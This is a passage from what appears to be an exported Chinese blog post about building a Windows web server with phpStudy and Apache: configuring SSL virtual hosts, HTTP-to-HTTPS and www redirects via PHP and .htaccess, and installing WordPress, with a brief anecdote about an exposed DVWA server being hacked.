SSL\n\n在访问例如腾讯云、百度等网站的时候，会在Chrome浏览器的网址栏看到这样一个绿色的小锁![](https://blog-10039692.file.myqcloud.com/1488437662385_3300_1488437662130.jpg) ，感觉特别好，但是访问我自己的网站却只有一个灰色的感叹号![http://dz.gl](https://blog-10039692.file.myqcloud.com/1488437772942_1273_1488437772290.jpg) ，于是就想，我的网站能不能也有这样一个绿色小锁呢？又是一番各种姿势百度，知道了这个是https协议，需要有网站安全证书，到百度搜了一番，都好贵，舍不得花钱啊~但是峰回路转，发现腾讯云有免费的SSL证书，在管理中心-左上角云产品-SSL证书管理里边，如图：\n![](https://blog-10039692.file.myqcloud.com/1488438092663_448_1488438101157.jpg)\n点击申请证书，按提示操作之后就可以拥有自己的证书了，不过，这个证书只支持2级域名\n![](https://blog-10039692.file.myqcloud.com/1488438268450_1105_1488438279405.jpg)\n之后在找到对应的证书并且在服务器上安装即可，我用的是Apache，所以把对应SSL证书(有三个文件)上传到服务器某目录下（例如我创建了PHPstudy/SSL文件夹并上传到该目录下），按照网上的教程修改配置文件，具体方法如下：\n\n1.  首先是确认ssl功能是否开启：找到PHPstudy/Apache/conf/httpd.conf这个配置文件中的LoadModule ssl_module modules/mod_ssl.so这句话是否前面有注释符#，如果有的话删掉注释符并保存；\n在PHPstudy/Apache/conf/httpd.conf中添加这样一句话：Include conf/vhost-ssl.conf 并保存；\n在PHPstudy/Apache/conf目录下创建vhost-ssl.conf文件，然后编辑（建议使用notepad++编辑，极不推荐记事本）之如下：\n```\n <VirtualHost *:443>\n  ServerName www.ctftools.com //这里改为你自己的域名，如果只有一个网站可以把这行删掉\n  DocumentRoot  \"C:\\WEB\\CTFtools\" //这里是你的网站目录\n  SSLEngine on\n  SSLProtocol  all -SSLv2 -SSLv3\n  SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL\n  SSLCertificateFile \"C:\\phpStudy\\ssl\\downssl\\1.crt\" //证书公钥，大小为2.01KB左右\n  SSLCertificateKeyFile \"C:\\phpStudy\\ssl\\downssl\\3.key\" //证书私钥\n  SSLCertificateChainFile \"C:\\phpStudy\\ssl\\downssl\\2.crt\" //证书链，大小为1.88KB左右\n </VirtualHost>\n //有几个站点就写几个这样的一段代码\n <VirtualHost *:443>\n  ServerName www.dr34m.cn\n  DocumentRoot \"C:\\WEB\\myhome\"\n  SSLEngine on\n  SSLProtocol  all -SSLv2 -SSLv3\n  SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL\n  SSLCertificateFile \"C:\\phpStudy\\ssl\\homessl\\1.crt\"\n  SSLCertificateKeyFile \"C:\\phpStudy\\ssl\\homessl\\3.key\"\n  SSLCertificateChainFile \"C:\\phpStudy\\ssl\\homessl\\2.crt\"\n </VirtualHost>\n```\n2.  重启phpstudy，然后访问https:// 再加上你的站点，是不是可以访问了？\n **注：**如果遇到重启后无法开启Apache，通常是你的配置文件有问题，要有耐心，慢慢查找配置文件的错误。还有一种可能是你的证书公钥和证书链两个文件反了，颠倒过来即可。\n\n ## 301重定向\n\n 刚开始是在访问腾讯云的时候，发现无论输入的是`qcloud.com`，还是`www.qcloud.com`，或者是`http://www.qcloud.com`，最后访问的都是`https://www.qcloud.com`，这个可就挺好玩的了，刚开始以为是做的跳转，在`qcloud.com`目录下建立一个自动跳转到`www.qcloud.com`的网页，后来知道是做的301重定向，做301重定向的好处就是对搜索引擎友好。为什么要做301重定向呢？一方面，301重定向可以使例如`qcloud.com`跳转到`www.qcloud.com`，这样能增加`www.qcloud.com`的权重；另一方面，我们之前做的SSL证书用的是443端口，并且网址前缀是https，用301重定向可以使得例如`http://www.qcloud.com`跳转到`https://www.qcoloud.com`，没有这步跳转，那我们的SSL证书就白用了，301重定向的办法很多，我用到了其中两种，具体如下：\n\n ### php做重定向\n\n 这种是用在例如`qcloud.com`跳转到`www.qcloud.com`上的，当然，有些网站的权重是放在没有www的网址上，把有www的跳转到没有www的网址上，也是同样的方法\n\n1.  在PHPstudy\\WWW目录下新建文件index.php（对于这种情况就不需要在站点域名配置中添加**非**权重网址了，但是权重网址还是要有的）；\n2.  编辑该文件如下\n```php\n<?php\n\n $the_host = $_SERVER['HTTP_HOST'];\n\n switch($the_host)\n {\n //下边的就是带www的网址作为权重网址的例子\n     case 'ctftools.com': //这里改为你的非权重网址\n     {\n         header('HTTP/1.1 301 Moved Permanently'); //301是永久重定向的意思\n         header('Location:https://www.ctftools.com/');  //这里改为你的权重网址\n     }\n     break;\n//下边的就是不带www的网址作为权重网址的例子\n     case 'www.dz.gl':\n     {\n         header('HTTP/1.1 301 Moved Permanently');\n         header('Location:http://dz.gl');\n     }\n     break;\n//下边则是不符合以上所有情况的例子，学过编程的应该都知道这些语法\n     default:\n     {\n         header('HTTP/1.1 302 Moved Permanently'); //302则是临时重定向的意思\n         header('Location:http://error.ctftools.com/404.html');  //这里可以定向到你的404页面\n     }\n }\n?>\n```\n\n ### .htaccess做重定向\n\n 上边的php方法对于权重网站重定向来说无疑是一种简单的方法，但是对于http向https跳转则没办法了，这就需要.htaccess做重定向（这种方法同样适用于权重网站跳转），方法如下：\n\n1.首先打开`PHPstudy/Apache/conf/httpd.conf`并检查`LoadModule rewrite_module modules/mod_rewrite.so`这句话前面有没有注释符#，有则删掉;\n在**网站目录**下创建.htaccess文件，这种以点开头的文件在windows下不好创建，通常使用dos命令来创建，或者用notepad++，新建一个文件，在保存的时候类型选择所有文件，文件名改为.htaccess，如图：![](https://blog-10039692.file.myqcloud.com/1488441538912_436_1488441538316.jpg)\n编辑该文件如下：\n```\n<IfModule mod_rewrite.c>\nRewriteEngine on\nRewriteCond %{SERVER_PORT} !^443$\nRewriteRule ^(.*)$ https://www.ctftools.com/$1 [L,R=301]  //改为你的站点\n</IfModule>\n```\n2. 这时候直接访问http:// 加上你的站点，是不是直接就能跳转到https:// 加上你的站点了？\n\n# 在服务器上安装wordpress\n\n**wordpress是一个著名的博客系统，安装主要用到了mysql(phpstudy集成了)，具体安装方法如下：**\n\n### 配置MySQL\n\n1.  首先修改mysql的密码(针对忘了密码或者不知道密码的童鞋)，如图修改即可；\n![](https://blog-10039692.file.myqcloud.com/1488443780553_6823_1488443779593.jpg)\n2.  接着访问：[http://你的IP/phpmyadmin](http://xn--ip-0p3cm89l/phpmyadmin) 或者点击phpstudy上边的MySQL管理器—MySQL-front（如图）\n![](https://blog-10039692.file.myqcloud.com/1488443755039_5831_1488443754438.jpg)\n3.  新建一个数据库：如图，以在服务器端MySQL-front中操作为例：\n右击左侧localhost—新建—数据库\n![](https://blog-10039692.file.myqcloud.com/1488444028336_2727_1488444027827.jpg)\n![](https://blog-10039692.file.myqcloud.com/1488444073489_993_1488444072473.jpg)\n\n### 安装wordpress\n\n1.  到[wordpress官网](https://cn.wordpress.org/)下载wordpress并上传到你的服务器某目录下；\n2.  访问\"你的目录所绑定域名/wp-admin/install.php\"，会出现如图：\n![](https://blog-10039692.file.myqcloud.com/1488444539486_5449_1488444539273.jpg)\n3.  按图操作：\n![](https://blog-10039692.file.myqcloud.com/1488444576677_3585_1488444575741.jpg)\n4.  如果数据库信息没有问题就会出现\n![](https://blog-10039692.file.myqcloud.com/1488444591766_7065_1488444590814.jpg)\n5.  接着按提示输入你的站点信息：\n![](https://blog-10039692.file.myqcloud.com/1488444713598_3604_1488444713356.jpg)\n6.  这样就可以拥有自己的博客或者论坛了\n关于windows建站经验就写到这里，以后我或许会改用linux，届时还会和大家分享，感谢阅读","slug":"post005","published":1,"updated":"2020-12-07T02:04:17.481Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rda0015q0szp1csxtmn","content":"<h1 id=\"接触\"><a href=\"#接触\" class=\"headerlink\" title=\"接触\"></a>接触</h1><h3 id=\"内网的尝试\"><a href=\"#内网的尝试\" class=\"headerlink\" title=\"内网的尝试\"></a>内网的尝试</h3><a id=\"more\"></a>\n<p>可能有点特别，我刚开始接触与网站相关是在一个关于DVWA这个漏洞系统的搭建上。那时破晓团队的创始人之一K0r4dji到我们学校来有一个讲座，他讲了很多看起来特别高大上的东西。演讲后有一个面基会，我就去参加并找到他，并表示想学一些网络安全技术，希望他能帮我引进门。他就给我介绍了很多东西，其中就包括了DVWA这个漏洞平台，于是百度安装方法，找到了一篇FreeBuf上的文章：<a href=\"http://www.freebuf.com/sectool/102661.html\" target=\"_blank\" rel=\"noopener\">新手指南：手把手教你如何搭建自己的渗透测试环境</a>接触到了xampp这款软件。但是安装了软件之后一脸懵逼，完全不懂，还好教程上边有详细的介绍，一步一步，虽然不理解，但是总归是成功安装了，在电脑上输入127.0.0.1/dvwa/login.php，成功进入！接下来问题就来了，我要如何让别人访问这个漏洞系统呢？教程写着：ip-address-of-windows-xp-machine/dvwa/login.php，于是我傻乎乎的在别的电脑上输入进去，结果不行，一番苦思冥想，终于尝试把“ip-address-of-windows-xp-machine”替换为我电脑内网的IP，成功了，有一点点小激动，也有了一些明悟，IP地址似乎就是相当于一台电脑的标志，每一台处于同一内网环境的电脑都有与其唯一对应的IP地址，通过这个IP可以访问这台电脑（服务器）的数据。之后我又尝试了用自己所学的HTML知识写了网页放到xampp\\htdocs目录，然后访问该电脑的IP，果然可以打开网站，仿佛明白的从小到大一直在访问的网站的一点工作方法。</p>\n<h3 id=\"公网服务器被黑\"><a href=\"#公网服务器被黑\" class=\"headerlink\" title=\"公网服务器被黑\"></a>公网服务器被黑</h3><p>之后偶然的一个机会得知了服务器运营商的存在，比如腾讯云、阿里云、百度云等等，于是我就在腾讯云上试用了一台服务器，用了windows系统，有5天时间，建议通过windows系统自带的远程桌面连接，方法为：</p>\n<p>按组合键windows+R，并在运行中输入”mstsc”；</p>\n<p>在跳出来的界面输入你的服务器公网IP地址，并按提示输入用户名和密码即可。<br>第一件事就是在上边安装了xampp，然后把xampp\\htdocs目录下文件替换为DVWA，接着把IP地址放到了一个CTF交流群里，当天晚上，有个人在群里问我，这是你的网站吗？我说是，他说你改一个文件给我看看，我就改了，然后我的服务器就被黑客拿下了，还留了后门……这之后才知道DVWA是不能乱放的，不过起码到此为止，我已经可以建立一个外网可以访问的网站了。</p>\n<h1 id=\"深入\"><a href=\"#深入\" class=\"headerlink\" title=\"深入\"></a>深入</h1><h3 id=\"有了模样\"><a href=\"#有了模样\" class=\"headerlink\" title=\"有了模样\"></a>有了模样</h3><p>我在阿里云的首页上看到有域名注册，于是尝试着注册了我的第一个域名：<strong>_</strong><em><strong>.top（这个域名现在已经不用了，所以打码了），记得是1块钱首年，嘿嘿，但还是不知道要怎么才能使得访问域名就能访问服务器。因为一直自学，我花费了好几天时间，才知道有域名解析这种东西，于是点击域名管理，找到我的域名后点击解析，点击添加记录，主机记录用了www，记录值就填上了我腾讯云服务器的IP地址，然后访问www.</strong></em><strong>_</strong>.top ，成功访问到了我的网站。再之后我开始自己手写网站，命名为1.html，放到服务器里，结果在我访问服务器的时候，浏览器直接列出了我的网站目录（xampp默认开启了目录列表，不然应该是403禁止访问），要手动点击1.html才能打开网站，这可别扭死了！如下图为列出目录<br><img src=\"https://blog-10039692.file.myqcloud.com/1488433467435_4319_1488433466589.jpg\"><br>下图为403<br><img src=\"https://blog-10039692.file.myqcloud.com/1488433487113_5678_1488433485867.jpg\" alt=\"\"><br>然后尝试各种姿势百度，百度了好长好长时间（估计这种人尽皆知的东西都没人懒得说），才看到了被一句带过的index.html，于是把网页重命名为index.html（修改配置文件也是可以修改默认主页的），成功了！至此，我的网站终于看起来像是一个网站了！如图为我当时建立网站之一：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488432964695_8706_1488432964443.jpg\" alt=\"\"></p>\n<h3 id=\"一服多站\"><a href=\"#一服多站\" class=\"headerlink\" title=\"一服多站\"></a>一服多站</h3><p>之后随着对CTF的了解，萌生了建立一个CTF资源站的想法，然后又想建立一个自己主页（这也算是一个小时候的梦想吧），但是服务器只有一台，IP只有一个，如果都放在同一个目录下用同一个域名的话总觉得别扭，这个要怎么解决呢？又一次和朋友聊天的时候他推荐给我一个软件叫phpstudy，果断放弃xampp使用phpstudy，在phpstudy有一个功能叫做站点域名管理，如下图<br><img src=\"https://blog-10039692.file.myqcloud.com/1488434278819_4925_1488434277635.jpg\" alt=\"\"><img src=\"https://blog-10039692.file.myqcloud.com/1488434289682_3677_1488434288559.jpg\" alt=\"\"><br>于是把需要的域名都通过A记录解析到我的服务器上，再添加到域名管理里边，成功实现了一服多站。<br>随着研究的深入，后来知道：phpstudy是基于apache（也可以选择nginx或iis作为phpstudy的基本程序），通过修改apache的站点配置文件（目录在PHPstudy/Apache/conf/vohsts.conf）也可以实现同样效果，相信聪明的你和我一样一看就懂了，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488436133365_8283_1488436133876.jpg\" alt=\"\"><br>至此，我已经可以较为完善的拥有一个网站服务器了</p>\n<h1 id=\"建站经验\"><a href=\"#建站经验\" class=\"headerlink\" title=\"建站经验\"></a>建站经验</h1><h3 id=\"备案\"><a href=\"#备案\" class=\"headerlink\" title=\"备案\"></a>备案</h3><p>备案对于国内网站来说是必不可少的一个环节，在腾讯云官网首页上就有备案的链接，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488436460607_8841_1488436459506.jpg\" alt=\"\"><br>按照要求一步步备案就好了，这里通常耗时较长，我的第一次备案差不多用了俩月可能还多，备案的过程中域名是不允许有解析的，也就是说，只要你要备案，你的网站必须是关闭的！所以对于有经验的站长来说，一般都是先备案，后建站，不然的话网站运行着好好的突然关了，不知道的人还以为你的网站倒闭了呢！或许有人不信邪，我就不备案咋了？不备案的话刚开始应该是没什么问题的，但使用一段时间之后，国内的服务商就会把你服务器的端口关掉，网站就用不了了，所以记住一句话：要建站，先备案！除非你用的是港服或者外服。</p>\n<h3 id=\"SSL\"><a href=\"#SSL\" class=\"headerlink\" title=\"SSL\"></a>SSL</h3><p>在访问例如腾讯云、百度等网站的时候，会在Chrome浏览器的网址栏看到这样一个绿色的小锁<img src=\"https://blog-10039692.file.myqcloud.com/1488437662385_3300_1488437662130.jpg\" alt=\"\"> ，感觉特别好，但是访问我自己的网站却只有一个灰色的感叹号<img src=\"https://blog-10039692.file.myqcloud.com/1488437772942_1273_1488437772290.jpg\" alt=\"http://dz.gl\"> ，于是就想，我的网站能不能也有这样一个绿色小锁呢？又是一番各种姿势百度，知道了这个是https协议，需要有网站安全证书，到百度搜了一番，都好贵，舍不得花钱啊~但是峰回路转，发现腾讯云有免费的SSL证书，在管理中心-左上角云产品-SSL证书管理里边，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488438092663_448_1488438101157.jpg\" alt=\"\"><br>点击申请证书，按提示操作之后就可以拥有自己的证书了，不过，这个证书只支持2级域名<br><img src=\"https://blog-10039692.file.myqcloud.com/1488438268450_1105_1488438279405.jpg\" alt=\"\"><br>之后在找到对应的证书并且在服务器上安装即可，我用的是Apache，所以把对应SSL证书(有三个文件)上传到服务器某目录下（例如我创建了PHPstudy/SSL文件夹并上传到该目录下），按照网上的教程修改配置文件，具体方法如下：</p>\n<ol>\n<li><p>首先是确认ssl功能是否开启：找到PHPstudy/Apache/conf/httpd.conf这个配置文件中的LoadModule ssl_module modules/mod_ssl.so这句话是否前面有注释符#，如果有的话删掉注释符并保存；<br>在PHPstudy/Apache/conf/httpd.conf中添加这样一句话：Include conf/vhost-ssl.conf 并保存；<br>在PHPstudy/Apache/conf目录下创建vhost-ssl.conf文件，然后编辑（建议使用notepad++编辑，极不推荐记事本）之如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;VirtualHost *:443&gt;</span><br><span class=\"line\"> ServerName www.ctftools.com //这里改为你自己的域名，如果只有一个网站可以把这行删掉</span><br><span class=\"line\"> DocumentRoot  &quot;C:\\WEB\\CTFtools&quot; //这里是你的网站目录</span><br><span class=\"line\"> SSLEngine on</span><br><span class=\"line\"> SSLProtocol  all -SSLv2 -SSLv3</span><br><span class=\"line\"> SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL</span><br><span class=\"line\"> SSLCertificateFile &quot;C:\\phpStudy\\ssl\\downssl\\1.crt&quot; //证书公钥，大小为2.01KB左右</span><br><span class=\"line\"> SSLCertificateKeyFile &quot;C:\\phpStudy\\ssl\\downssl\\3.key&quot; //证书私钥</span><br><span class=\"line\"> SSLCertificateChainFile &quot;C:\\phpStudy\\ssl\\downssl\\2.crt&quot; //证书链，大小为1.88KB左右</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br><span class=\"line\">//有几个站点就写几个这样的一段代码</span><br><span class=\"line\">&lt;VirtualHost *:443&gt;</span><br><span class=\"line\"> ServerName www.dr34m.cn</span><br><span class=\"line\"> DocumentRoot &quot;C:\\WEB\\myhome&quot;</span><br><span class=\"line\"> SSLEngine on</span><br><span class=\"line\"> SSLProtocol  all -SSLv2 -SSLv3</span><br><span class=\"line\"> SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL</span><br><span class=\"line\"> SSLCertificateFile &quot;C:\\phpStudy\\ssl\\homessl\\1.crt&quot;</span><br><span class=\"line\"> SSLCertificateKeyFile &quot;C:\\phpStudy\\ssl\\homessl\\3.key&quot;</span><br><span class=\"line\"> SSLCertificateChainFile &quot;C:\\phpStudy\\ssl\\homessl\\2.crt&quot;</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启phpstudy，然后访问https:// 再加上你的站点，是不是可以访问了？<br><strong>注：</strong>如果遇到重启后无法开启Apache，通常是你的配置文件有问题，要有耐心，慢慢查找配置文件的错误。还有一种可能是你的证书公钥和证书链两个文件反了，颠倒过来即可。</p>\n<h2 id=\"301重定向\"><a href=\"#301重定向\" class=\"headerlink\" title=\"301重定向\"></a>301重定向</h2><p>刚开始是在访问腾讯云的时候，发现无论输入的是<code>qcloud.com</code>，还是<code>www.qcloud.com</code>，或者是<code>http://www.qcloud.com</code>，最后访问的都是<code>https://www.qcloud.com</code>，这个可就挺好玩的了，刚开始以为是做的跳转，在<code>qcloud.com</code>目录下建立一个自动跳转到<code>www.qcloud.com</code>的网页，后来知道是做的301重定向，做301重定向的好处就是对搜索引擎友好。为什么要做301重定向呢？一方面，301重定向可以使例如<code>qcloud.com</code>跳转到<code>www.qcloud.com</code>，这样能增加<code>www.qcloud.com</code>的权重；另一方面，我们之前做的SSL证书用的是443端口，并且网址前缀是https，用301重定向可以使得例如<code>http://www.qcloud.com</code>跳转到<code>https://www.qcoloud.com</code>，没有这步跳转，那我们的SSL证书就白用了，301重定向的办法很多，我用到了其中两种，具体如下：</p>\n<h3 id=\"php做重定向\"><a href=\"#php做重定向\" class=\"headerlink\" title=\"php做重定向\"></a>php做重定向</h3><p>这种是用在例如<code>qcloud.com</code>跳转到<code>www.qcloud.com</code>上的，当然，有些网站的权重是放在没有www的网址上，把有www的跳转到没有www的网址上，也是同样的方法</p>\n</li>\n<li><p>在PHPstudy\\WWW目录下新建文件index.php（对于这种情况就不需要在站点域名配置中添加<strong>非</strong>权重网址了，但是权重网址还是要有的）；</p>\n</li>\n<li><p>编辑该文件如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"> $the_host = $_SERVER[<span class=\"string\">'HTTP_HOST'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">switch</span>($the_host)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"comment\">//下边的就是带www的网址作为权重网址的例子</span></span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"string\">'ctftools.com'</span>: <span class=\"comment\">//这里改为你的非权重网址</span></span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         header(<span class=\"string\">'HTTP/1.1 301 Moved Permanently'</span>); <span class=\"comment\">//301是永久重定向的意思</span></span><br><span class=\"line\">         header(<span class=\"string\">'Location:https://www.ctftools.com/'</span>);  <span class=\"comment\">//这里改为你的权重网址</span></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"comment\">//下边的就是不带www的网址作为权重网址的例子</span></span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"string\">'www.dz.gl'</span>:</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         header(<span class=\"string\">'HTTP/1.1 301 Moved Permanently'</span>);</span><br><span class=\"line\">         header(<span class=\"string\">'Location:http://dz.gl'</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"comment\">//下边则是不符合以上所有情况的例子，学过编程的应该都知道这些语法</span></span><br><span class=\"line\">     <span class=\"keyword\">default</span>:</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         header(<span class=\"string\">'HTTP/1.1 302 Moved Permanently'</span>); <span class=\"comment\">//302则是临时重定向的意思</span></span><br><span class=\"line\">         header(<span class=\"string\">'Location:http://error.ctftools.com/404.html'</span>);  <span class=\"comment\">//这里可以定向到你的404页面</span></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"htaccess做重定向\"><a href=\"#htaccess做重定向\" class=\"headerlink\" title=\".htaccess做重定向\"></a>.htaccess做重定向</h3><p>上边的php方法对于权重网站重定向来说无疑是一种简单的方法，但是对于http向https跳转则没办法了，这就需要.htaccess做重定向（这种方法同样适用于权重网站跳转），方法如下：</p>\n</li>\n</ol>\n<p>1.首先打开<code>PHPstudy/Apache/conf/httpd.conf</code>并检查<code>LoadModule rewrite_module modules/mod_rewrite.so</code>这句话前面有没有注释符#，有则删掉;<br>在<strong>网站目录</strong>下创建.htaccess文件，这种以点开头的文件在windows下不好创建，通常使用dos命令来创建，或者用notepad++，新建一个文件，在保存的时候类型选择所有文件，文件名改为.htaccess，如图：<img src=\"https://blog-10039692.file.myqcloud.com/1488441538912_436_1488441538316.jpg\" alt=\"\"><br>编辑该文件如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;IfModule mod_rewrite.c&gt;</span><br><span class=\"line\">RewriteEngine on</span><br><span class=\"line\">RewriteCond %&#123;SERVER_PORT&#125; !^443$</span><br><span class=\"line\">RewriteRule ^(.*)$ https://www.ctftools.com/$1 [L,R=301]  //改为你的站点</span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>这时候直接访问http:// 加上你的站点，是不是直接就能跳转到https:// 加上你的站点了？</li>\n</ol>\n<h1 id=\"在服务器上安装wordpress\"><a href=\"#在服务器上安装wordpress\" class=\"headerlink\" title=\"在服务器上安装wordpress\"></a>在服务器上安装wordpress</h1><p><strong>wordpress是一个著名的博客系统，安装主要用到了mysql(phpstudy集成了)，具体安装方法如下：</strong></p>\n<h3 id=\"配置MySQL\"><a href=\"#配置MySQL\" class=\"headerlink\" title=\"配置MySQL\"></a>配置MySQL</h3><ol>\n<li>首先修改mysql的密码(针对忘了密码或者不知道密码的童鞋)，如图修改即可；<br><img src=\"https://blog-10039692.file.myqcloud.com/1488443780553_6823_1488443779593.jpg\" alt=\"\"></li>\n<li>接着访问：<a href=\"http://xn--ip-0p3cm89l/phpmyadmin\" target=\"_blank\" rel=\"noopener\">http://你的IP/phpmyadmin</a> 或者点击phpstudy上边的MySQL管理器—MySQL-front（如图）<br><img src=\"https://blog-10039692.file.myqcloud.com/1488443755039_5831_1488443754438.jpg\" alt=\"\"></li>\n<li>新建一个数据库：如图，以在服务器端MySQL-front中操作为例：<br>右击左侧localhost—新建—数据库<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444028336_2727_1488444027827.jpg\" alt=\"\"><br><img src=\"https://blog-10039692.file.myqcloud.com/1488444073489_993_1488444072473.jpg\" alt=\"\"></li>\n</ol>\n<h3 id=\"安装wordpress\"><a href=\"#安装wordpress\" class=\"headerlink\" title=\"安装wordpress\"></a>安装wordpress</h3><ol>\n<li>到<a href=\"https://cn.wordpress.org/\" target=\"_blank\" rel=\"noopener\">wordpress官网</a>下载wordpress并上传到你的服务器某目录下；</li>\n<li>访问”你的目录所绑定域名/wp-admin/install.php”，会出现如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444539486_5449_1488444539273.jpg\" alt=\"\"></li>\n<li>按图操作：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444576677_3585_1488444575741.jpg\" alt=\"\"></li>\n<li>如果数据库信息没有问题就会出现<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444591766_7065_1488444590814.jpg\" alt=\"\"></li>\n<li>接着按提示输入你的站点信息：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444713598_3604_1488444713356.jpg\" alt=\"\"></li>\n<li>这样就可以拥有自己的博客或者论坛了<br>关于windows建站经验就写到这里，以后我或许会改用linux，届时还会和大家分享，感谢阅读</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"接触\"><a href=\"#接触\" class=\"headerlink\" title=\"接触\"></a>接触</h1><h3 id=\"内网的尝试\"><a href=\"#内网的尝试\" class=\"headerlink\" title=\"内网的尝试\"></a>内网的尝试</h3>","more":"<p>可能有点特别，我刚开始接触与网站相关是在一个关于DVWA这个漏洞系统的搭建上。那时破晓团队的创始人之一K0r4dji到我们学校来有一个讲座，他讲了很多看起来特别高大上的东西。演讲后有一个面基会，我就去参加并找到他，并表示想学一些网络安全技术，希望他能帮我引进门。他就给我介绍了很多东西，其中就包括了DVWA这个漏洞平台，于是百度安装方法，找到了一篇FreeBuf上的文章：<a href=\"http://www.freebuf.com/sectool/102661.html\" target=\"_blank\" rel=\"noopener\">新手指南：手把手教你如何搭建自己的渗透测试环境</a>接触到了xampp这款软件。但是安装了软件之后一脸懵逼，完全不懂，还好教程上边有详细的介绍，一步一步，虽然不理解，但是总归是成功安装了，在电脑上输入127.0.0.1/dvwa/login.php，成功进入！接下来问题就来了，我要如何让别人访问这个漏洞系统呢？教程写着：ip-address-of-windows-xp-machine/dvwa/login.php，于是我傻乎乎的在别的电脑上输入进去，结果不行，一番苦思冥想，终于尝试把“ip-address-of-windows-xp-machine”替换为我电脑内网的IP，成功了，有一点点小激动，也有了一些明悟，IP地址似乎就是相当于一台电脑的标志，每一台处于同一内网环境的电脑都有与其唯一对应的IP地址，通过这个IP可以访问这台电脑（服务器）的数据。之后我又尝试了用自己所学的HTML知识写了网页放到xampp\\htdocs目录，然后访问该电脑的IP，果然可以打开网站，仿佛明白的从小到大一直在访问的网站的一点工作方法。</p>\n<h3 id=\"公网服务器被黑\"><a href=\"#公网服务器被黑\" class=\"headerlink\" title=\"公网服务器被黑\"></a>公网服务器被黑</h3><p>之后偶然的一个机会得知了服务器运营商的存在，比如腾讯云、阿里云、百度云等等，于是我就在腾讯云上试用了一台服务器，用了windows系统，有5天时间，建议通过windows系统自带的远程桌面连接，方法为：</p>\n<p>按组合键windows+R，并在运行中输入”mstsc”；</p>\n<p>在跳出来的界面输入你的服务器公网IP地址，并按提示输入用户名和密码即可。<br>第一件事就是在上边安装了xampp，然后把xampp\\htdocs目录下文件替换为DVWA，接着把IP地址放到了一个CTF交流群里，当天晚上，有个人在群里问我，这是你的网站吗？我说是，他说你改一个文件给我看看，我就改了，然后我的服务器就被黑客拿下了，还留了后门……这之后才知道DVWA是不能乱放的，不过起码到此为止，我已经可以建立一个外网可以访问的网站了。</p>\n<h1 id=\"深入\"><a href=\"#深入\" class=\"headerlink\" title=\"深入\"></a>深入</h1><h3 id=\"有了模样\"><a href=\"#有了模样\" class=\"headerlink\" 